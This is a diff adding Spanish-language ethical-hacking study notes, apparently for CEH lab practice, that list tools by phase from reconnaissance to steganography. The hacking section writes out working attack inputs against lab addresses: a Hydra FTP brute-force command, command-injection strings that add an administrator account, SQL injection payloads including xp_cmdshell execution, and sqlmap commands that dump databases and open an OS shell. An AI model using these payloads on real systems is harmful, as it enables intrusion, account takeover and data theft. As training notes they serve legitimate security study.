@@ -1,0 +1,44 @@
+
++ Reconocimiento
+    - Angry IP Scanner
+    - NetCraft (dominios y datos)
+    - CentralOps (dominios y datos)
+    - DNSRecon -t brt -d subdomains...
+
++ Escaneo
+    - Nmap / ZenMap
+        * nbstat / snmp-sysdescr / smtp-enum-users / http-waf-detect url
+
++ Enumeración
+    - Active Directory Explorer (AD Explorer)
+    - SkipFish (webs) / skipfish -o /home/attacker/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.1.22:8080
+    - uniscan -u url -we / -u url -d
+    - zaproxy (owasp web)
+    - vega (web - win11)
+
++ Analisis de vulnerabilidades
+    - Nessus
+    - Nikto (escaner web)
+    - SQLMap
+
++ Hacking
+    * Contraseñas
+        - Responder - JohnTheRipper / responder -I eth0 (usr/share/responder/logs) / Win11 share \\ceh-tools / john hash.txt
+        - L0pthcrack (windows)
+        - Hashcat
+        - Ophcrack (windows)
+    * Web
+        - THC Hydra (crakc ftp) / hydra -L wl_usernames.txt -P wl_passwords.txt ftp://10.10.1.11
+        - BurpSuite (proxy local 8080) / proxy url login (wp-login.php?) / parametrizas admin - pass y cargas wl / buscas 302
+        - Injection: "| net user /add user pwd" "net localgroup administrators Test /Add"
+        - cd log4j-shell-poc
+    * SQL
+        - "blah' or 1=1 --" / "blah';insert into login values ('john','apple123'); --" / "blah';exec master..xp_cmdshell 'comando a ejecutar cmd'"
+        - SQLmap: Login / Inspect / Document.Cookie "" / sqlmap -u "urlcompleta" --cookie="pegar" --dbs / en lugar de --dbs usar -D basededatos --tables / -D basededatos -T tabla --dump / --os-shell
+
+--------------------------------------
+* Criptografía
+    - HashCalc
+    - CrypTool - CrytpForge (Encriptar/Desencriptar)
+* Steganografía
+    - OpenStego (Win11)
